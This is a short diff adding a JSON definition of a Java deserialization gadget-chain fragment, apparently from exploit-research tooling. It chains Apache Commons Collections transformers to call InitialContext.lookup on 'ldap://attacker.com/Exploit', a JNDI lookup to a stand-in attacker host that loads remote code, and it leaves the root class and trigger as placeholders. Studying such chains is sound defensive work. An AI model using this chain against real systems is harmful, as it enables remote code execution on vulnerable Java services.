@@ -1,0 +1,29 @@
+{
+  "chain_type": "Fragment: JNDI lookup sink",
+  "root_class": "PLACEHOLDER_ROOT",
+  "root_trigger": "PLACEHOLDER",
+  "links": [
+    {
+      "class": "org.apache.commons.collections.functors.ConstantTransformer",
+      "field_overrides": {
+        "iConstant": "javax.naming.InitialContext"
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InstantiateTransformer",
+      "field_overrides": {
+        "iParamTypes": [],
+        "iArgs": []
+      }
+    },
+    {
+      "class": "org.apache.commons.collections.functors.InvokerTransformer",
+      "field_overrides": {
+        "iMethodName": "lookup",
+        "iParamTypes": ["java.lang.String"],
+        "iArgs": ["ldap://attacker.com/Exploit"]
+      }
+    }
+  ],
+  "sink_method": "InitialContext.lookup(ldap://...)"
+}
